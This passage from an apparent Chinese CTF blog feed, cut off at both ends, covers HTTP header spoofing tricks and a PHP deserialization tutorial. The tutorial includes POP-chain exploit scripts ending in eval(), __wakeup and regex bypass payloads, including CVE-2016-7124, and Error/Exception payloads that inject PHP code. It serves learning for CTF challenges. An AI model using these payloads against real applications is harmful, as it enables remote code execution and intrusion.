class="params">(p Person)</span></span> Secret (test <span class="type">string</span>) <span class="type">string</span> &#123;</span><br><span class="line">    out, \_ := exec.Command(test).CombinedOutput()</span><br><span class="line">    <span class="keyword">return</span> <span class="type">string</span>(out)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>常见的各种http要求以及对应的headers</title>
      <link href="/posts/93fc8735.html"/>
      <url>/posts/93fc8735.html</url>
      
        <content type="html"><![CDATA[<h1 id="GET-传参">GET 传参</h1><p>传参传的参数会被理解成字符串, 传数组如下，[]内不填默认为 0<br><a href="http://xxx.com/?a=1&amp;b=2&amp;c%5B0%5D=3&amp;c%5B1%5D=4&amp;d%5B%5D=5">xxx.com/?a=1&amp;b=2&amp;c[0]=3&amp;c[1]=4&amp;d[]=5</a></p><h1 id="POST-传参">POST 传参</h1><p>把 GET 请求改为 POST, 如果用的 burp 可以用这个一键切<br><img src="/img/web/http/change_request.png" alt=""></p><p>不能切的话把 GET 改为 POST，在下面加<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 0<br>Content-Length 需要改数值，建议勾选 burp 的修改 body 长度（默认勾选）不用手动更改，数值取决于你 POST 传参的长度，如 a=4 长度为 3<br>当存在 Transfer-Encoding: chunked 时，Content-Length 会被忽略<br>没有 POST 传参最后要留两行空，不然会无法打开<br>POST 参数跟 http 头之间要空一行，后面不能有空行</p><p><img src="/img/web/http/change_request.png" alt=""></p><h1 id="PUT-等更多类型的传参">PUT 等更多类型的传参</h1><p>直接把 GET 开头改成 PUT 就行</p><h1 id="要求-ip-地址为-127-0-0-1-要求本地权限">要求 ip 地址为 127.0.0.1 / 要求本地权限</h1><p>这种要求如果在 http 题中只要 xff 伪造 ip 就行，如果要 ssrf 伪造它就不是 http 题</p><p>X-Forwarded-For: 127.0.0.1<br>Client-IP: 127.0.0.1<br>X-Real-IP: 127.0.0.1<br>这三个任选添加，都可能通过，大小写随意，注意 xff 的 ed 不要少写。</p><h1 id="要求挂代理">要求挂代理</h1><p>via: xxx.vip</p><h1 id="SERVER-‘FLAG’-123’等-php-参数">$_SERVER[‘FLAG’]=='123’等 php 参数</h1><p>FLAG: 123</p><h1 id="要求改-UA-浏览器">要求改 UA / 浏览器</h1><p>User-Agent: Firefox Browser</p><h1 id="要求你的邮件地址">要求你的邮件地址</h1><p>From: <a href="mailto:xxx@example.com">xxx@example.com</a></p><h1 id="要求来自-网址-origin">要求来自 网址 (origin)</h1><p>Referer: <a href="http://xxx.org">xxx.org</a></p><h1 id="要求改-Cookie">要求改 Cookie</h1><p>格式如 Cookie: user=admin</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php的pop链构造&amp;反序列化</title>
      <link href="/posts/32daafef.html"/>
      <url>/posts/32daafef.html</url>
      
        <content type="html"><![CDATA[<h1 id="写在前面">写在前面</h1><p>构造 pop 链，归根结底就是一条绳子，从你开始的函数穿到危险函数（或者指向 flag），所以你要做的第一件事，就是确认你的开始和结尾。</p><h1 id="部分魔术方法触发方法">部分魔术方法触发方法</h1><pre><code>__wakeup() 使用 unserialize()时优先触发__sleep() 使用 serialize()时优先触发__construct() 创建对象时自动触发__destruct() 对象被销毁时自动触发__get() 用于从不可访问的属性读取数据 $this-&gt;known-&gt;unknown;__call() 在对象上下文中调用不可访问的方法时触发 $this-&gt;known-&gt;unknown();__callStatic() 在静态上下文中调用不可访问的方法时触发 static $known;$this-&gt;known-&gt;unknown();__set() 用于将数据写入不可访问的属性 $this-&gt;known-&gt;unknown='set';__toString() 把变量当作字符串使用时触发 echo $this-&gt;known; die($this-&gt;known);__invoke() 当尝试以调用函数的方式调用一个对象时触发 $this-&gt;known();__isset() 在不可访问的属性上调用 isset()或 empty()触发__unset() 在不可访问的属性上使用 unset()时触发</code></pre><h1 id="不含绕过的链子构造">不含绕过的链子构造</h1><p>__wakeup(), __construct(), __destruct() 都可以看做开头，优先级从左到右。你要做的，就是引导这个绳子头，直至穿到危险函数。</p><p>我们来看一道例题，这是我在学习构造 pop 链时做出的第一道题，出自 Geek Challenge 2024 unsign</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">syc</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cuit</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;action!&lt;br&gt;&quot;</span>);</span><br><span class="line">        <span class="variable">$function</span>=<span class="variable language_">$this</span>-&gt;cuit;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();<span class="comment">#$this-&gt;known();  invoke</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">lover</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$yxx</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$QW</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;invoke!&lt;br&gt;&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;yxx-&gt;QW;<span class="comment">#$this-&gt;known-&gt;unknown;  get</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">web</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$eva1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$interesting</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$var</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;get!&lt;br&gt;&quot;</span>);</span><br><span class="line">        <span class="variable">$eva1</span>=<span class="variable language_">$this</span>-&gt;eva1;</span><br><span class="line">        <span class="variable">$eva1</span>(<span class="variable language_">$this</span>-&gt;interesting);<span class="comment">#危险函数</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>我们注意到 class web 下存在一种很危险的格式<br><strong>$eva1($this-&gt;interesting);</strong> 也就是在 $eva1=&quot;eval&quot;时，就能用 eval()了，所以它作为尾。<br>链子总结如下</p><pre><code>syc#cuit__destruct()-&gt;lover#yxx__invoke()-&gt;web#yxx__get()-&gt;eval()</code></pre><p>关键 exp</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$syc</span>=<span class="keyword">new</span> syc;</span><br><span class="line"><span class="variable">$lover</span>=<span class="keyword">new</span> lover;</span><br><span class="line"><span class="variable">$web</span>=<span class="keyword">new</span> web;</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$syc</span>;</span><br><span class="line"><span class="variable">$url</span>-&gt;cuit=<span class="variable">$lover</span>;</span><br><span class="line"><span class="variable">$lover</span>-&gt;yxx=<span class="variable">$web</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$url</span>);<span class="comment">//syc#cuit__destruct()-&gt;lover#yxx__invoke()-&gt;web#yxx__get()-&gt;eval()</span></span><br></pre></td></tr></table></figure><h1 id="需要绕过的链子构造">需要绕过的链子构造</h1><h2 id="private-和-protected-属性的变量">private 和 protected 属性的变量</h2><p>PHP7.1 后对 private 和 protect 已不敏感，但之前的版本赋值时一定要注意<br>输出 serialize 时一定要经过编码，基本是 url 编码，如果题目要求 base64 编码就不用先 url 编码了<br>当你要对 private 和 protected 里的数赋值时，使用__construct()赋值</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">web</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> a=<span class="string">&#x27;aaa&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> b;</span><br><span class="line">    <span class="keyword">protected</span> c;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b=<span class="string">&#x27;bbb&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;c=<span class="string">&#x27;ccc&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>强调下 construct 的赋值方式，不能直接写$b, 要写$this-&gt;b, 且 function 前加 public。</p><h2 id="str-replace-替换字符导致的字符串逃逸">str_replace 替换字符导致的字符串逃逸</h2><p>比如替换函数为 str_replace(‘hacker’, ‘SDPCSEC’, $parm); 因为替换后被替换的字符串前的数字不变，所以每替换一次可以多出一个可供构造的字符。<br>举例：比如我想构造 <code>&quot;;&#125;</code> ，<br>构造的字符串为：</p><pre><code>O:3:&quot;CTF&quot;:4:&#123;s:4:&quot;name&quot;:s:21:&quot;hackerhackerhacker&quot;;&#125;&quot;;&#125;</code></pre><p>经过替换后：</p><pre><code>O:3:&quot;CTF&quot;:4:&#123;s:4:&quot;name&quot;:s:21:&quot;SDPCSECSDPCSECSDPCSEC&quot;;&#125;&quot;;&#125;</code></pre><p>替换后被替换的字符串前的数字匹配成功，导致字符串可被构造逃逸、<br>一个参考的构造程序，$a 开头要加&quot;用于闭合。结尾要有; }用于结束反序列化。</p><h3 id="替换后字符变多">替换后字符变多</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;&quot;;s:1:&quot;B&quot;;s:12:&quot;[phpinfo();]&quot;;s:1:&quot;C&quot;;N;&#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$a</span>);<span class="variable">$i</span>++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;SDPCSEC&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">strlen</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><h3 id="替换后字符变少">替换后字符变少</h3><p>（待更新）</p><h2 id="wakeup-绕过">wakeup 绕过</h2><h3 id="增加属性对象绕过（CVE-2016-7124）">增加属性对象绕过（CVE-2016-7124）</h3><pre><code>PHP5 &lt; 5.6.25 和 PHP7 &lt; 7.0.10</code></pre><p>我们增加 :{ 前的数字，这会绕过 wakeup 检测。</p><pre><code>O:7:&quot;Secrect&quot;:2:&#123;s:13:&quot;%00Secrect%00demo&quot;;s:15:&quot;unseria1i2e.php&quot;;s:4:&quot;file&quot;;s:8:&quot;f14g.php&quot;;&#125;</code></pre><p>绕过为</p><pre><code>O:7:&quot;Secrect&quot;:3:&#123;s:13:&quot;%00Secrect%00demo&quot;;s:15:&quot;unseria1i2e.php&quot;;s:4:&quot;file&quot;;s:8:&quot;f14g.php&quot;;&#125;</code></pre><h3 id="C-开头绕过">C 开头绕过</h3><p>ArrayObject 内置类可以构造以 C 开头的反序列化 <a href="https://www.yuque.com/boogipop/tdotcs/hobe2yqmb3kgy1l8?singleDoc#">https://www.yuque.com/boogipop/tdotcs/hobe2yqmb3kgy1l8?singleDoc#</a></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//$a为进入的入口</span></span><br><span class="line"><span class="variable">$aa</span>=<span class="keyword">new</span> <span class="built_in">ArrayObject</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$aa</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="comment"># O:3:...</span></span><br><span class="line"><span class="comment"># C:11:&quot;ArrayObject&quot;:...</span></span><br></pre></td></tr></table></figure><p>这里注意 ArrayObject 构造 C 开头的序列化只在 PHP/7.3 之前的版本中存在。<br>又已知__unserialize()在 php7.4 才可用，但其实 C 开头在全版本都可用，所以 payload 在 7.3 版本跑不用担心过不去，把__unserialize()替换成__wakeup()一样可行。</p><h2 id="正则匹配绕过">正则匹配绕过</h2><p>假设有这样一个序列化字符串：</p><pre><code>O:4:&quot;Test&quot;:1:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;&#125;</code></pre><p>假设此时的匹配为(preg_match(‘/username/’, $data)); 这时你可以把 username 前的 s 大写，并将你要绕过的内容或一部分转为 16 进制，如</p><pre><code>O:4:&quot;Test&quot;:1:&#123;S:8:&quot;\75sername&quot;;s:5:&quot;admin&quot;;&#125;</code></pre><p>注：测试时发现 C 开头无法用大写 S 进行十六进制的绕过，O 开头和 a 开头没这个问题</p><p>如果此时的匹配为(preg_match(‘/O:[%d]’, $data)); 你可以这么写</p><pre><code>O:+4:&quot;Test&quot;:1:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;&#125;</code></pre><p>再不行就用 a 开头或 C 开头绕过，版本用 7.3 及以下。</p><p>a 开头：</p><pre><code>$b=array($a);echo serialize($b);</code></pre><h2 id="throw-new-Exception-绕过-GC-回收">throw new Exception()绕过: GC 回收</h2><p>throw new Error()或 throw new Exception()都属于非正常退出的情况，所以不会调用__destruct() 方法<br>具体绕过的参考文献<br><a href="https://blog.csdn.net/Jayjay___/article/details/132463913">https://blog.csdn.net/Jayjay___/article/details/132463913</a><br><a href="https://blog.csdn.net/Jayjay___/article/details/130647484">https://blog.csdn.net/Jayjay___/article/details/130647484</a></p><h3 id="fast-destruct">fast-destruct</h3><p>正常 payload</p><pre><code>a:2:&#123;i:0;O:1:&quot;a&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;123&quot;;&#125;i:1;s:4:&quot;1234&quot;;&#125;</code></pre><h4 id="删除末尾花括号">删除末尾花括号</h4><pre><code>a:2:&#123;i:0;O:1:&quot;a&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;123&quot;;&#125;i:1;s:4:&quot;1234&quot;;</code></pre><h4 id="改数字：把最后-i-后的数字减少-1">改数字：把最后 i 后的数字减少 1</h4><pre><code>a:2:&#123;i:0;O:1:&quot;a&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;123&quot;;&#125;i:0;s:4:&quot;1234&quot;;&#125;</code></pre><h3 id="php-issue-9618">php issue#9618</h3><p>版本条件：</p><ul><li>7.4.x - 7.4.30</li><li>8.0.x</li></ul><h4 id="属性值的长度不匹配">属性值的长度不匹配</h4><pre><code>//正常 payloadO:1:&quot;A&quot;:2:&#123;s:4:&quot;info&quot;;O:1:&quot;B&quot;:1:&#123;s:3:&quot;end&quot;;N;&#125;s:4:&quot;Aend&quot;;s:1:&quot;1&quot;;&#125;//外部类属性值长度异常 payload：//先外类__destruct()后内类__wakeup()O:1:&quot;A&quot;:2:&#123;s:4:&quot;info&quot;;O:1:&quot;B&quot;:1:&#123;s:3:&quot;end&quot;;N;&#125;s:4:&quot;Aend&quot;;s:2:&quot;1&quot;;&#125;O:1:&quot;A&quot;:2:&#123;s:4:&quot;info&quot;;O:1:&quot;B&quot;:1:&#123;s:3:&quot;end&quot;;N;&#125;s:4:&quot;Aend&quot;;s:1:&quot;12&quot;;&#125;</code></pre><h4 id="去掉内部类的分号">去掉内部类的分号</h4><p>注：</p><pre><code>这样内部类直接回收，外部类没事，可以直接不执行内部类的wakeup。外部类去掉分号同理。如果内部外部类的花括号紧贴，也可以在两个花括号中间加分号，可绕过内部类wakeup。//正常 payloadO:1:&quot;A&quot;:2:&#123;s:4:&quot;info&quot;;O:1:&quot;B&quot;:1:&#123;s:3:&quot;end&quot;;N**;**&#125;s:3:&quot;end&quot;;s:1:&quot;1&quot;;&#125;//去掉了内部类的分号的 payloadO:1:&quot;A&quot;:2:&#123;s:4:&quot;info&quot;;O:1:&quot;B&quot;:1:&#123;s:3:&quot;end&quot;;N&#125;s:3:&quot;end&quot;;s:2:&quot;1&quot;;&#125;</code></pre><h3 id="利用-null-回收">利用 null 回收</h3><p><img src="/img/web/geek2024/GC%E5%9B%9E%E6%94%B6.png" alt=""><br>假设要序列化的类为$a：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$n</span>=<span class="literal">null</span>;</span><br><span class="line">    <span class="variable">$payload</span>=<span class="keyword">array</span>(<span class="variable">$a</span>,<span class="variable">$n</span>);</span><br><span class="line">    <span class="variable">$jay17</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$payload</span>);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    a:2:&#123;i:0;O:3:&quot;one&quot;:2:&#123;s:6:&quot;object&quot;;O:6:&quot;second&quot;:1:&#123;s:8:&quot;filename&quot;;O:3:&quot;one&quot;:2:&#123;s:6:&quot;object&quot;;O:5:&quot;third&quot;:1:&#123;s:13:&quot; third string&quot;;a:1:&#123;s:6:&quot;string&quot;;a:2:&#123;i:0;O:3:&quot;one&quot;:2:&#123;s:6:&quot;object&quot;;N;s:9:&quot;year_parm&quot;;a:1:&#123;i:0;s:10:&quot;Happy_func&quot;;&#125;&#125;i:1;s:6:&quot;MeMeMe&quot;;&#125;&#125;&#125;s:9:&quot;year_parm&quot;;a:1:&#123;i:0;s:10:&quot;Happy_func&quot;;&#125;&#125;&#125;s:9:&quot;year_parm&quot;;a:1:&#123;i:0;s:10:&quot;Happy_func&quot;;&#125;&#125;i:1;N;&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><pre><code>把最后的 i:1换成i:0，提前销毁最终的链子为a:2:&#123;i:0;O:3:&quot;one&quot;:2:&#123;s:6:&quot;object&quot;;O:6:&quot;second&quot;:1:&#123;s:8:&quot;filename&quot;;O:3:&quot;one&quot;:2:&#123;s:6:&quot;object&quot;;O:5:&quot;third&quot;:1:&#123;s:13:&quot; third string&quot;;a:1:&#123;s:6:&quot;string&quot;;a:2:&#123;i:0;O:3:&quot;one&quot;:2:&#123;s:6:&quot;object&quot;;N;s:9:&quot;year_parm&quot;;a:1:&#123;i:0;s:10:&quot;Happy_func&quot;;&#125;&#125;i:1;s:6:&quot;MeMeMe&quot;;&#125;&#125;&#125;s:9:&quot;year_parm&quot;;a:1:&#123;i:0;s:10:&quot;Happy_func&quot;;&#125;&#125;&#125;s:9:&quot;year_parm&quot;;a:1:&#123;i:0;s:10:&quot;Happy_func&quot;;&#125;&#125;i:0;N;&#125;</code></pre><h2 id="取地址绕过-wakeup-赋值">取地址绕过 wakeup 赋值</h2><p>这里举个例子：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>, <span class="variable">$b</span>, <span class="variable">$t</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="string">&quot;new B()&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b = <span class="variable language_">$this</span>-&gt;t;</span><br><span class="line">        <span class="title function_ invoke__">var_dump</span>(<span class="variable">$this</span>-&gt;a);</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;flag&#123;test&#125;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>求怎么拿到 flag。这里直接构造<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mo>−</mo><mo>&gt;</mo><mi>a</mi><mo>=</mo></mrow><annotation encoding="application/x-tex">A-&gt;a=</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">A</span><span class="mord">−</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span></span></span></span>B; 是不行的，因为 wakeup 会把 a 改为字符串。<br>注意到$this-&gt;b = $this-&gt;t;如果赋值 a 为 b 的地址，那么当 b 赋值时会同样会为 a 赋值。<br>exp</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$A</span> = <span class="keyword">new</span> A;</span><br><span class="line"><span class="variable">$B</span> = <span class="keyword">new</span> B;</span><br><span class="line"><span class="variable">$A</span>-&gt;a = &amp;<span class="variable">$A</span>-&gt;b; <span class="comment">//与 $A-&gt;b = &amp;$A-&gt;a; 同义</span></span><br><span class="line"><span class="variable">$A</span>-&gt;t = <span class="variable">$B</span>;</span><br><span class="line"><span class="variable">$payload</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$A</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$payload</span>;</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$payload</span>);</span><br><span class="line"><span class="comment">// var_dump =&gt; object(B)#3 (0) &#123;&#125;</span></span><br></pre></td></tr></table></figure><p>同样这个小技巧也适用于 destruct 的初始赋值</p><h2 id="两变量哈希相等">两变量哈希相等</h2><h3 id="引用绕过">引用绕过</h3><p>b 取 a 的地址</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="title function_ invoke__">uniqid</span>();</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;a === <span class="variable language_">$this</span>-&gt;b) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;Success&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>poc</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$test</span>=<span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="variable">$test</span>-&gt;b=&amp;<span class="variable">$test</span>-&gt;a;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$test</span>));</span><br></pre></td></tr></table></figure><h3 id="内置类绕过">内置类绕过</h3><h4 id="Error（仅能用于-PHP7）">Error（仅能用于 PHP7）</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SYCLOVER</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$syc</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lover</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$str</span> = <span class="string">&quot;?&gt;&lt;?=include~&quot;</span>.<span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;%d0%99%93%9e%98&quot;</span>).<span class="string">&quot;?&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="variable">$str</span>,<span class="number">1</span>);<span class="variable">$b</span>=<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="variable">$str</span>,<span class="number">2</span>);</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> SYCLOVER;</span><br><span class="line"><span class="variable">$c</span>-&gt;syc = <span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$c</span>-&gt;lover = <span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$c</span>));</span><br><span class="line"><span class="meta">?&gt;</span><span class="comment">//注意两个Error一定要同行</span></span><br><span class="line"><span class="comment">//str开头要用?&gt;闭合</span></span><br></pre></td></tr></table></figure><h4 id="Exception-PHP5-PHP7-可用">Exception(PHP5, PHP7 可用)</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CDUTSEC</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$cmd</span>=<span class="string">&quot;phpinfo();?&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="variable">$cmd</span>,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$tr</span> = <span class="keyword">new</span> CDUTSEC;</span><br><span class="line"><span class="variable">$tr</span>-&gt;var1=<span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$tr</span>-&gt;var2=<span class="variable">$b</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$tr</span>));</span><br></pre></td></tr></table></figure><h2 id="绕过反复调用">绕过反复调用</h2><p>多实例化一个对象<br>举个例子：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>, <span class="variable">$c</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$var</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">        <span class="variable">$f</span> = <span class="variable language_">$this</span>-&gt;c;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$f</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable 